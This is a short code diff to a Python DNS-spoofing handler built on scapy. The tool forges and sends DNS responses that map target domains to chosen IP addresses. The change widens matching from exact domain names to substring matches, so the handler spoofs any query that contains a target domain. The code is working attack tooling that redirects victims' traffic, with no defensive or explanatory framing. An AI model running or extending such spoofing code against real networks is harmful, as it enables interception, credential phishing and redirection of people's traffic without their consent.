@@ -195,7 +195,7 @@ class DnsHandler(object):
             query_name = pkt[DNS].qd.qname.decode()
 
             for domain in self.spoof_dict:
-                if domain == query_name:
+                if domain in query_name:
                     response = self.get_spoofed_dns_response(pkt, self.spoof_dict[domain])
                     scapy.send(response, verbose=False)
                     return f"Spoofed DNS response for {query_name} with IP {self.spoof_dict[domain]}"
